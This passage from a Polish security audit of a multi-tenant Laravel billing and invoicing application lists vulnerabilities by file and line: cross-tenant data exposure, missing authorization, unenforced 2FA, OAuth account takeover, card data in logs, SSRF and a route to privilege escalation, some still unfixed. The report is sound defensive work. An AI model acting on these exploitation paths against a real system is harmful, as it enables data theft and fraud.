6. **2FA nieegzekwowane** — nowy middleware `mfa` (`EnsureTwoFactorVerified`) odrzuca żądania z tokenem `mfa=1` (2FA włączone, niezaliczone). Podpięty w głównych grupach tras (`routes/api.php`, `routes/api/user.php`, `routes/api/invitations.php`).
7. **OAuth account takeover** — `OAuthController::callback` linkuje tożsamość przez `OAuthAccount` (provider + provider_user_id) zamiast logować po samym e-mailu; jeśli e-mail już istnieje w systemie bez linku, użytkownik jest odsyłany z błędem zamiast być zalogowanym do cudzego konta.

**Efekt uboczny odkryty przy naprawie:** Spatie Permission ma włączone `teams` (`team_foreign_key = tenant_id`), ale `setPermissionsTeamId()` był wołany tylko w seederze, nigdy w runtime — więc `assignRole()`/`hasRole()` operowały na pustym/nieprawidłowym kontekście tenanta w całej aplikacji. Dodano `App\Domain\Rights\Support\TenantScopedRoles` — pomocnik do poprawnego (jawnie tenant-scoped) przypisywania i sprawdzania ról, użyty we wszystkich powyższych fixach oraz podpięty w `UserTenant::boot()` i `User::assignToPosition()` (miejsca zapisu ról). **To punktowa naprawa tylko w dotkniętych miejscach — reszta aplikacji nadal nie ma globalnego mechanizmu ustawiającego team ID per-request; jeśli w przyszłości pojawią się inne miejsca wołające `assignRole()`/`hasRole()` bezpośrednio, będą miały ten sam problem.** Warto rozważyć osobny follow-up: albo globalny middleware ustawiający team ID (wymaga starannego zbadania kolejności middleware), albo konsekwentne użycie `TenantScopedRoles` wszędzie.

**Nienaprawione (świadomie odłożone, HIGH/MEDIUM z Fazy 0):** rate limiting na auth endpoints, enumeracja userów przez reset hasła, bug `birthDate` w rejestracji, IDOR w `ApplicationInvitationController`, plaintext API keys, `UserSession.revoked_at` niesprawdzane, `SignedImageUrlGenerator` gubiący TTL, `RoleName::fromCaseInsensitive` zepsute, martwy kod w `ChatMessage`/`ChatParticipant`, brak walidacji tenanta w `DirectMessageController::createRoom`, endpointy admina z niedziałającym bypassem — wracamy do nich po Fazie 1, albo wcześniej jeśli priorytet się zmieni.

### Faza 1 — Płatności/finanse (Stripe/Subscription, Financial, Exchanges/NBP)

**Ocena ogólna: najpoważniejsza sekcja audytu jak dotąd.** Realne pieniądze + dane kart płatniczych + ten sam wzorzec braku RBAC/tenant-scopingu co w Fazie 0, tym razem bez żadnego pokrycia testami.

- **[CRITICAL]** `app/Domain/Subscription/DTOs/PaymentDetailsDTO.php`, `StoreSubscriptionRequest.php:24-26`, `StripePaymentService.php:16-47` — backend przyjmuje surowy numer karty + CVC od klienta i przekazuje do Stripe zamiast tokenizacji po stronie klienta (Stripe.js/Elements). To zakres zgodności PCI-DSS SAQ D (audytowany, kosztowny) zamiast SAQ A. Każdy request z kartą przechodzi przez serwery aplikacji, jej logi, load balancery.
- **[CRITICAL]** `app/Domain/Subscription/Actions/CreateSubscriptionAction.php:59-66` — przy wyjątku podczas tworzenia subskrypcji cały DTO (włącznie z numerem karty i CVC) jest serializowany do `Log::error()`. Karta odrzucona przez Stripe (częsty, normalny przypadek) = pełny PAN+CVC w logach w plaintext.
- **[CRITICAL]** `SubscriptionController`, `AddonPurchaseController`, `SubscriptionInvoiceController` — modele `Subscription`/`BillingCustomer`/`SubscriptionInvoice`/`AddonPurchase` bez `tenant_id`/tenant-scope. `index()` zwraca dane wszystkich tenantów bez filtra; `show/update/destroy` bez sprawdzenia właściciela. Dowolny user dowolnej firmy widzi/anuluje/zmienia subskrypcje wszystkich innych tenantów w systemie.
- **[CRITICAL]** `StoreSubscriptionRequest.php:20` — walidacja `billingCustomerId` to tylko `exists:billing_customers,id`, bez sprawdzenia właściciela — można doczepić nową subskrypcję do cudzego `BillingCustomer`.
- **[HIGH]** `StripeWebhookController.php:46-124` — podpis webhooka weryfikowany poprawnie, ale brak dedup po `event.id`. Stripe gwarantuje at-least-once delivery; przy pierwszym podpiętym listenerze (patrz niżej) retry zdubluje efekty (np. wysyłkę maila).
- **[HIGH]** Brak RBAC w całej domenie Subscription — każdy member (nie tylko Owner/Admin) może anulować subskrypcję, zmienić plan, kupić addon.
- **[HIGH]** Zdarzenia domenowe (`InvoicePaid`, `InvoicePaymentFailed`, `SubscriptionCreated/Cancelled/Updated`) są dispatchowane, ale nie mają ani jednego listenera — brak powiadomień o nieudanej płatności/anulowaniu. "Stripe billing" oznaczone w README jako zrobione jest funkcjonalnie niedokończone.
- **[HIGH]** Zero testów automatycznych dla całej domeny Stripe/Subscription — najbardziej krytycznej finansowo integracji w systemie.
- **[HIGH]** `app/Domain/Financial/Controllers/VatRateController.php:59-78` — stawki VAT (globalne, współdzielone przez wszystkich tenantów) może tworzyć/usuwać dowolny zalogowany user — brak policy/roli.
- **[MEDIUM]** Błąd zaokrąglania float→cents w `StripeService::formatAmount` (dziś dead code, ale gotowa mina).
- **[MEDIUM]** `PaymentMethodController` bez policy — dowolny member tenanta zarządza metodami płatności.
- **[MEDIUM]** Import kursów NBP (`ImportExchangeRatesJob`) nie waliduje wartości kursu przed zapisem, brak retry/backoff przy awarii NBP, niespójny klucz dedup vs. brak unique constraint w DB (ryzyko duplikatów przy równoległym uruchomieniu).
- **Weryfikacja README:** 11.1 (plany) potwierdzone; 11.3 (Stripe billing) mylące — działa podstawowy flow, ale podważone przez CRITICAL findings i brak listenerów; 11.4 (auto-renewal) i 11.5 (account lockout) faktycznie brak — potwierdzone jako nieoznaczone `[x]`, zgodne z README. W efekcie plany/limity subskrypcji dziś **niczego nie ograniczają**.

### Faza 1 — KSeF, OCR (Azure), Ai (OpenRouter)

**Wzorzec wspólny dla wszystkich trzech:** zbudowana infrastruktura ochronna (limity, autoryzacja, szyfrowanie), która nigdzie nie jest realnie wpięta w faktyczny przepływ; zero testów; jawne TODO/"not yet implemented" w krytycznych ścieżkach.

- **[CRITICAL — SYSTEMOWE]** `app/Domain/Tenant/Models/TenantIntegration.php:41,57-63` — cast `'credentials' => 'encrypted:json'` jest zdefiniowany, ale obok istnieje accessor/mutator przez `Attribute::make()`, który w Eloquencie ma pierwszeństwo przed `$casts` — więc `encrypted:json` **nigdy się nie wykonuje**. Potwierdzone przez typ kolumny (`jsonb`, zaszyfrowany string by tam nie pasował). **Wszystkie credentiale per-tenant (klucze Azure, certyfikaty/tokeny KSeF, przyszłe integracje) leżą w bazie jawnym tekstem** mimo pozoru szyfrowania. Dotyczy każdej integracji korzystającej z `TenantIntegration`, nie tylko OCR.
- **[CRITICAL]** `app/Domain/Tenant/Controllers/TenantIntegrationController.php:56-65` (`store()`) — brak `$this->authorize(...)` (w przeciwieństwie do show/update/destroy), `StoreTenantIntegrationRequest::authorize()` zawsze `true`. Dowolny user tenanta może utworzyć integrację `azureAi` w trybie `custom` z dowolnym `endpoint` bez walidacji domeny — możliwy SSRF/eksfiltracja dokumentów (faktury z NIP-ami/IBAN wysyłane na serwer atakującego). Dodatkowo: brak zarejestrowanej `TenantIntegrationPolicy` w systemie oznacza, że `show/update/destroy` prawdopodobnie zawsze rzucają `AuthorizationException` — czyli "utwórz dowolne, nie możesz obejrzeć/zmienić" to typowy ślad niedotestowanego end-to-end kodu.
- **[CRITICAL]** `app/Domain/Expense/Actions/ApplyOcrResultToExpenseAction.php:83` — `VatRate::firstWhere(...)->toDTO() ?? ...` — `??` chroni `toDTO()`, nie `firstWhere()`. Nietypowa stawka VAT z OCR → `firstWhere()` zwraca `null` → `null->toDTO()` rzuca `\Error` (nie `\Exception`) → `FinishOcrJob` łapie tylko `\Exception`, więc `\Error` przechodzi niezłapany. Expense/OcrRequest zawisają trwale w stanie "Processing" bez żadnej informacji dla użytkownika.
- **[CRITICAL]** KSeF nie jest podłączony do żadnej funkcji biznesowej — `KSeFService` to kompletny, ale nieużywany SDK (zero wywołań poza martwym przykładem demonstracyjnym, brak Controllera/Route/Action, brak kolumn DB na numer referencyjny/UPO/status). README "(partially)" jest łagodnym określeniem — to nieużywany kod, nie częściowa integracja.
- **[CRITICAL]** `app/Services/KSeF/Authenticators/KSeFAuthenticator.php:15,36-43` — cache tokenu sesji KSeF pod globalnym kluczem (`ksef:session_token`), bez `tenant_id`. Gdy integracja zostanie kiedyś dopięta bez naprawienia tego: Tenant B może wysłać fakturę autoryzowaną sesją Tenanta A. Dziś nieaktywne (bo nic tego nie woła), ale musi być naprawione **przed** dokończeniem integracji KSeF.
- **[HIGH]** `app/Services/AzureDocumentIntelligence/DocumentAnalysisService.php:173-195` — `pollForAnalysisResult` to `while(true){...sleep(2);}` bez limitu iteracji/deadline'u — zawieszony model Azure = worker kolejki zablokowany w nieskończoność.
- **[HIGH]** `StartOcrJob`/`FinishOcrJob` — łapią wyjątek i od razu wołają `$this->fail($ex)`, co w Laravelu pomija dalsze automatyczne próby niezależnie od `$tries=5`. Skonfigurowany retry z backoffem nigdy się nie uruchamia.
- **[HIGH]** `ApplyOcrResultToExpenseAction::mapDocumentToExpense()` — Azure DTO niesie `confidence` per pole, ale nic go nie odczytuje ani nie porównuje z progiem. Kwoty/NIP/IBAN z OCR wpisywane wprost do Expense niezależnie od pewności rozpoznania, bez sygnału "sprawdź ręcznie" w UI/API.
- **[HIGH]** `app/Domain/Tenant/Services/IntegrationLimitService.php` istnieje (limity planu na integracjach) ale zero wywołań z domeny Expense/OCR. `UploadExpenseOcrRequest` bez `max:` liczby/rozmiaru plików, bez `mimes:`. Brak throttle globalnie. Jeden request z 500 plikami = 500 płatnych wywołań Azure bez żadnego capa.
- **[HIGH]** Brak jakiegokolwiek rate limitingu/quoty na `POST /ai/chat` (OpenRouter, płatne per-request), brak `max:` na długość wiadomości w `AiChatRequest`.
- **[MEDIUM/HIGH]** `AiChatController` — komentarz sugeruje przetwarzanie w tle, ale `streamAiResponse()` wykonuje się synchronicznie w wątku HTTP (brak `dispatch()` w całej domenie Ai) — ryzyko wyczerpania puli workerów pod obciążeniem.
- **[MEDIUM]** Brak walidacji `history` czatu AI przeciw faktycznie zapisanym `ChatMessage` — klient może wstrzyknąć fikcyjne tury do promptu.
- **[MEDIUM]** `OPENROUTER_LOG=true` na współdzielonym środowisku zrzuca pełną treść rozmów (potencjalne PII) do logów.
- **[MEDIUM]** `KSeFService::getSessionInfo()` zawsze rzuca `BadMethodCallException` (gwarantowanie zepsute); `OcrRequest::processable()` ma jawny TODO o brakującym filtrze tenant_id (nieaktywne dziś, bo processable_id nie pochodzi z inputu).
- **OK:** izolacja tenantów w Chat/AI działa poprawnie (`ChatRoom` ma `BelongsToTenant`, kontekst auth dostępny synchronicznie); brak XSS w renderowaniu odpowiedzi AI po stronie frontendu.
- **Zero testów** dla KSeF, OCR/Expense, Ai/OpenRouter.

### Faza 1 — REGON/VIES/Biała Lista (IdentityCheck), IbanInfo, EDoreczenia

- **[CRITICAL]** `RegistryConfirmationJob` (`ProcessContractorRegistryConfirmationJob.php:57-61`) — status potwierdzenia zgodności z rejestrem ustawiany bezwarunkowo na `Success` (jedyny warunek to brak wyjątku), niezależnie od faktycznego wyniku porównania (`nameMatch`/`vatIdMatch`). Wynik porównania zapisywany jest zresztą pod kluczem `'success'`, którego nie ma w `$fillable`/schemacie tabeli — Eloquent go cicho odrzuca. **Kontrahent z danymi niezgodnymi z REGON/VIES/Białą Listą dostaje w UI status "zweryfikowano"** — bezpośrednio podważa wartość dowodową dla należytej staranności VAT.
- **[CRITICAL]** `IdentityConfirmationController::submitSigned()` — jedyny działający przepływ potwierdzania tożsamości (XAdES) nigdy nie zapisuje wyniku do modelu audytowego `IdentityCheck`. Poprawna implementacja (`SignatureBasedIdentityCheckService`) istnieje, ale jest martwym kodem — nigdzie niewywoływana.
- **[CRITICAL]** Podwójny, wzajemnie nadpisujący się zapis do tego samego rekordu `RegistryConfirmation` w przepływie kolejkowym (dwie niezależnie napisane warstwy zapisu, nigdy nieuzgodnione).
- **[CRITICAL]** EDoreczenia: **zero tras HTTP zarejestrowanych** — `CertificateController`/`MessageController` całkowicie nieosiągalne z zewnątrz.
- **[CRITICAL]** EDoreczenia: schemat bazy niezgodny z modelami/kontrolerami (brakujące kolumny `content`, `recipient`, `is_valid`, `serial_number` itd.) — **gwarantowany `QueryException` przy pierwszym użyciu**, gdyby ktoś podłączył trasy.
- **[CRITICAL]** EDoreczenia: brak zarejestrowanej Policy — `authorizeResource()` odmówi każdemu zawsze.
- **[CRITICAL]** EDoreczenia: dwie sprzeczne implementacje providera (różne auth, różne endpointy) — ta realnie wstrzykiwana do kontrolerów nie jest tą podłączoną w kontenerze DI.
- **[CRITICAL]** EDoreczenia: `verifyCertificate()` w realnie używanej implementacji to zaślepka `return true` — każdy certyfikat, także fałszywy/wygasły, zostałby uznany za ważny.
- **[HIGH]** Prawdziwy zapis IBAN-u kontrahenta/tenanta (`StoreContractorBankAccountRequest` i analogiczne) nie jest w ogóle walidowany checksumą — tylko `max:50`. Walidacja regex+mod-97 istnieje wyłącznie w oderwanym, opcjonalnym endpointcie `/utils/iban-info`, którego zapis konta nie używa. Błędny IBAN trafia prosto na fakturę/przelew SEPA.
- **[HIGH]** VIES: legalna odpowiedź "VAT nieważny" (`&lt;valid&gt;false&lt;/valid&gt;`) traktowana jako błąd API i rzuca wyjątkiem zamiast zwrócić poprawny wynik negatywny — bardzo częsty przypadek (firmy zwolnione z VAT-UE) generuje szum w logach i brakujące rekordy zamiast "niepotwierdzone".
- **[HIGH]** Brak throttlingu na kosztownych endpointach lookupu rejestrów; klucz REGON jest globalny (nie per-tenant) z twardym limitem 6000/h — dowolny user dowolnego tenanta może wyczerpać limit dla całej platformy.
- **[HIGH]** EDoreczenia: zero wykonywalnych testów — wszystkie 12 testów ma `markTestSkipped()`, deweloper sam udokumentował świadomość, że moduł nie działa.
- **[HIGH]** EDoreczenia: brak deklarowanego szyfrowania certyfikatów at rest — realne ryzyko RODO dla kwalifikowanych certyfikatów.
- **[HIGH]** EDoreczenia: rozjazd nazwy pola walidacji vs. odczytu w kontrolerze certyfikatów — upload pliku certyfikatu nigdy się nie wykona.
- **[HIGH]** EDoreczenia: brak retry/timeout na wywołaniach zewnętrznych, brak transakcyjności/idempotencji przy tworzeniu wiadomości+załączników+wysyłce — dla korespondencji z realnym skutkiem prawnym to istotne ryzyko.
- **[MEDIUM]** Synchroniczny `ContractorRegistryConfirmationService::confirm()` wstrzykiwany, ale nigdy wołany — sprawdzenie rejestru triggeruje się wyłącznie przy tworzeniu kontrahenta, nie po edycji NIP/nazwy.
- **[MEDIUM]** `config/services.php:105-118` — komentarz z halucynacją AI: "Money Forward — Japanese Business Verification" opisujący integrację z polskim Ministerstwem Finansów (Biała Lista). Nieszkodliwe, ale dowód że ten blok nigdy nie był czytany przez człowieka.
- **[MEDIUM]** Cache Białej Listy nie uwzględnia parametru `date` w kluczu (API MF zwraca "stan na dzień"), TTL 12h — wynik z wczoraj może być zaprezentowany jako "sprawdzone dzisiaj".
- **[MEDIUM]** `CompanyDataFetcherService` blokuje wątek HTTP (`sleep()`-polling do 10s) czekając na joby REGON/VIES/MF, cicho gubi spóźnione wyniki bez informowania usera o niepełnym sprawdzeniu.
- **[MEDIUM]** Pełny IBAN logowany w plaintext przy każdym błędzie zewnętrznego API.
- **[MEDIUM]** Błędy zewnętrznego IBAN API (429/5xx/timeout) nie do odróżnienia od "IBAN nieprawidłowy" — user dostaje ten sam komunikat.
- **[MEDIUM]** EDoreczenia: credentiale/skrzynka globalne dla całej platformy, mimo architektury sugerującej per-tenant certyfikaty (`getTenantProvider()`).
- **OK/pozytyw:** architektura cache IbanInfo (Redis → DB 30 dni → API) sensowna; `BankCode` poprawnie bez tenant scope (słusznie globalne dane referencyjne).

**Testy/PHPStan:** wcześniej brak `vendor/` w środowisku review — tylko `php -l`. **2026-07-02 (wieczór):** pełna weryfikacja w Sail — **`composer larastan` → 3 błędy**; **`artisan test` → 6 failed / 269 passed / 31 skipped** (po migracji `contacts`). Logi: [`REVIEW_LOCAL_QUALITY_RUN.md`](REVIEW_LOCAL_QUALITY_RUN.md) · [`phpstan.txt`](REVIEW_LOCAL_QUALITY_RUN/phpstan.txt) · [`artisan-test.txt`](REVIEW_LOCAL_QUALITY_RUN/artisan-test.txt). **Merge zablokowany do naprawy PHPStan + 6 testów.**

### Faza 0 — Multi-tenancy i klasy bazowe

**Ocena ogólna:** rdzeń mechanizmu (proste `WHERE tenant_id`, fail-closed sentinel `'none'`, spójny `BaseModel`) jest solidny. Jeden krytyczny bug punktowy + kilka niedokończonych fragmentów.

- **[CRITICAL]** `app/Domain/Tenant/Models/Tenant.php:295-305` — `Tenant::bypassTenant()` bez `try/finally`. Wyjątek wewnątrz callbacka trwale "zatrzaskuje" `Tenant::$BYPASSED_TENANT_ID` na ID tenanta do restartu procesu. Ponieważ kolejki idą przez Horizon (długożyjące procesy), kolejne joby bez zalogowanego usera (np. `FinishOcrJob`, `ImportExchangeRatesJob`) mogą czytać/zapisywać dane losowego, przeciekniętego tenanta. Trigger: wyjątek w dowolnym z 6 kroków `InitializeTenantDefaults::execute()` (rejestracja tenanta). Naprawa: trywialna (`try/finally`), priorytet: natychmiastowy, przed dalszą pracą.
- **[HIGH]** `app/Domain/Admin/Products/Controllers/AdminProductController.php` i `AdminContractorController.php` (`show/update/destroy`) — próbują `withoutGlobalScope(TenantScope::class)` w ciele metody, ale route-model-binding rozwiązuje się wcześniej (ze scope'em aktywnym) — więc admin nie może zarządzać zasobami innego tenanta mimo takiego zamiaru w kodzie. Brak testów na `routes/api/admin.php`.
- **[HIGH]** `app/Domain/Common/Models/OcrRequest.php` — ma `tenant_id`, ale brak `BelongsToTenant`/`IsGlobalOrBelongsToTenant`. Nieaktywne dziś (brak bezpośredniego route-bindingu), ale otwarta furtka na przyszłość; autor zostawił `// TODO: Add where tenant_id`.
- **[MEDIUM]** `app/Domain/Chat/Models/ChatMessage.php`, `ChatParticipant.php` — `BelongsToTenant` zaimportowany, ale użycie zakomentowane. Bezpieczeństwo dziś opiera się wyłącznie na ręcznych sprawdzeniach w kontrolerze.
- **[MEDIUM]** `app/Domain/Chat/Controllers/DirectMessageController.php:32` (`createRoom`) — brak walidacji, że drugi user należy do tego samego tenanta.
- **[LOW]** `app/Domain/Approval/Models/ApprovalExpenseExecution.php:55`, `ApprovalWorkflowStep.php:48` — relacje z `withoutGlobalScopes()`, same modele bez własnego scope'u (ryzyko architektoniczne, nie aktywny wyciek).
- **[LOW]** `tests/Unit/Domain/Tenant/BelongsToTenantTest.php:44` — ustawia `Tenant::$BYPASSED_TENANT_ID` bez resetu w `tearDown()`.

### Faza 0 — Rights (uprawnienia, role)

**Wzorzec:** system RBAC istnieje jako "rusztowanie" (Role/Permission/seeder), ale w praktyce jest podłączony tylko punktowo — większość endpointów sprawdza wyłącznie członkostwo w tenancie, nie rolę/uprawnienie.

- **[CRITICAL]** `app/Domain/Tenant/Policies/TenantPolicy.php:19-22` — `update`/`delete` sprawdzają tylko członkostwo, nie rolę. Dowolny user (nawet bez uprawnień) może `DELETE /v1/tenants/{tenant}` — skasować całą firmę — albo edytować jej dane.
- **[CRITICAL]** `app/Domain/Rights/Controllers/RoleController.php` — zero autoryzacji (brak policy/gate, `authorize()` zawsze `true`). Każdy user może tworzyć/edytować/usuwać dowolne role w tenancie, w tym nadawać sobie permissions.
- **[CRITICAL]** `app/Domain/Tenant/Controllers/TenantInvitationController.php:53-59` — jawny `// TODO: Add authorization check`, `role` z requestu niewalidowany przeciw liście ról. Dowolny user może zaprosić samego siebie (drugi e-mail) z `role: "Admin"` i po `accept()` stać się globalnym Adminem tenanta — pełna eskalacja uprawnień.
- **[HIGH]** `app/Domain/Tenant/Models/Tenant.php:295-305` — ten sam `bypassTenant()` bez `try/finally` co w sekcji multi-tenancy (potwierdzone niezależnie przez drugi agent).
- **[MEDIUM]** `app/Domain/Tenant/Controllers/OrganizationUnitController.php:91-103` (`assignUserToUnit`) — brak autoryzacji, IDOR: dowolny user może przypisać dowolnego innego użytkownika tenanta do stanowiska. Dziś częściowo nieszkodliwe (brak API tworzącego `role_name` na stanowisku), ale gotowa ścieżka eskalacji na przyszłość.
- **[MEDIUM]** `app/Domain/Rights/Enums/RoleName.php:15-18` — `fromCaseInsensitive()` zepsute (lowercase vs case-sensitive `tryFrom`), zawsze zwraca fallback `User`. Martwy kod, nieużywany.
- **[LOW]** Walidacja `permissions.*` w `StoreRoleRequest`/`UpdateRoleRequest` pomija tenant-scoping modelu `Permission`.
- **[LOW]** Brak testów dla `RoleController`, `TenantPolicy`, `TenantInvitationController::send` — krytyczne ścieżki niepokryte.

### Faza 0 — Common (`HasIndexQuery`, `HasActivityLogging`, `HasMediaSignedUrls`)

- **[CRITICAL]** `app/Domain/Common/Controllers/ActivityLogController.php:44-53` — filtr `where('tenant_id', ...)` buduje `$query`, ale wywołanie `getIndexPaginator($request)` nie przekazuje go dalej (buduje nowy Builder od zera) — filtr jest martwym kodem. `GET /v1/logs` zwraca activity log **wszystkich tenantów** dla dowolnego zalogowanego usera. Porównanie z poprawnym wzorcem obok (`TenantActivityLogController::index`, przekazuje `query:`) potwierdza, że to przeoczenie/regres, nie decyzja projektowa.
- **[HIGH]** `app/Domain/Common/Traits/HasActivityLog.php:14-21` — `logOnly(['*'])` na modelach z danymi wrażliwymi (numery IBAN kontrahentów, dane kontaktowe, kwoty faktur) — w połączeniu z powyższym CRITICAL, te dane są czytelne dla obcych tenantów.
- **[MEDIUM]** `app/Domain/Common/Support/SignedImageUrlGenerator.php:9-26` — gubi parametr `expiration` przy wywołaniu `RelativeUrlSigner::generate()`; deklarowane 60s ważności linku do pliku, realnie 15 min (domyślna wartość).
- **[LOW]** `HasIndexQuery`/filtry (`AdvancedFilter`, `ComboSearchFilter`) — bez zastrzeżeń, nazwy kolumn z allow-list w kontrolerach, nie z requestu; brak potwierdzonej SQL injection.
- **[LOW]** Brak testów dla `HasIndexQuery`, `ActivityLogController` (test feature na `/v1/logs` wyłapałby powyższy CRITICAL), `HasMediaSignedUrls`.

### Faza 0 — Auth

**Wzorzec:** dużo "rusztowania" pod właściwe zabezpieczenia (modele, DTO, enumy), ale kluczowe spięcia łączące je z faktyczną egzekucją nie są dokończone.

- **[CRITICAL]** `AuthController.php:36-62` + `JwtHelper.php:54-66` — 2FA jest kosmetyczne. Login wydaje pełnoprawny token niezależnie od tego, czy user ma włączone 2FA; claim `mfa` w JWT nigdzie nie jest egzekwowany (brak middleware). Znajomość samego hasła wystarcza mimo włączonego 2FA.
- **[CRITICAL]** `app/Domain/Auth/Controllers/OAuthController.php:23-45` — logowanie po samym e-mailu (`firstOrCreate(['email' => ...])`), model `OAuthAccount` istnieje ale nigdy nie jest używany do linkowania tożsamości. Ryzyko przejęcia konta lokalnego przez OAuth z tym samym e-mailem. Dodatkowo: `stateless()` (brak ochrony CSRF w handshake), JWT w query string URL przekierowania (trafia do historii/logów).
- **[HIGH]** Brak rate limitingu na `login`, `register`, `forgot-password`, `reset-password`, `oauth/*`, `2fa/verify` — brute-force bez żadnej blokady poza reCAPTCHA v3.
- **[HIGH]** `PasswordResetController.php:35-48` — enumeracja userów przez różne kody/treści odpowiedzi (400 vs 200) w zależności od istnienia e-maila.
- **[HIGH]** `AuthController.php:83-91` (`register()`) — bug typu: `isset($validated['birth_date'])` ale odczyt `$validated['birthDate']` (camelCase/snake_case mismatch) → `new \DateTime(null)` → `TypeError` przy zapisie do DTO. **Rejestracja z polem `birthDate` zwraca 500** — feature oznaczony w README jako zrobiony faktycznie nie działa.
- **[HIGH]** `app/Domain/Auth/Controllers/ApplicationInvitationController.php` — IDOR/BOLA: `index()` zwraca wszystkie zaproszenia w systemie; `cancel()`/`resend()` bez weryfikacji właściciela; `accept()`/`reject()` bez sprawdzenia `email === user.email` przed zmianą stanu. Trasy poza grupą `is_active` — działa nawet dla niezatwierdzonych kont.
- **[HIGH]** `app/Domain/Auth/Controllers/ApiKeyController.php` + `ApiKeyResource.php:24` — klucze API przechowywane i zwracane jawnym tekstem przy każdym odczycie (nie tylko raz przy tworzeniu).
- **[MEDIUM]** `logout()` odwołuje tylko access token, nie refresh token; `UserSession.revoked_at` nigdzie nie jest sprawdzane przy autoryzacji (kosmetyczne); `UserSession::isCurrent()` ma zepsute porównanie (zawsze `false`).
- **[MEDIUM]** Słaba polityka haseł (`min:8`, brak `Password::uncompromised()`), niespójna między rejestracją a resetem.
- **[MEDIUM]** Zmiana e-maila konta bez ponownej weryfikacji (`// TODO: Email/Phone confirmation` w kodzie).
- **[MEDIUM]** Wyłączenie 2FA bez ponownego uwierzytelnienia (samo `auth:api` wystarcza).
- **[MEDIUM]** Brak throttlingu na panelu admina (`AdminAuthController`).
- **[LOW]** Kilka mniejszych: token weryfikacji e-mail bez `expires_at` i bez `hash_equals()`, `remember` ignorowany przy refresh, status zaproszeń jako string zamiast enum, martwy import `RespondsWithToken` w `OAuthController`.
- **Testy:** praktycznie zerowe pokrycie krytycznych ścieżek (`login`, `register`, `refresh`, `logout`, `OAuth`, `2FA`, `forgot/reset-password`) — stąd żaden z powyższych bugów nie został wyłapany.
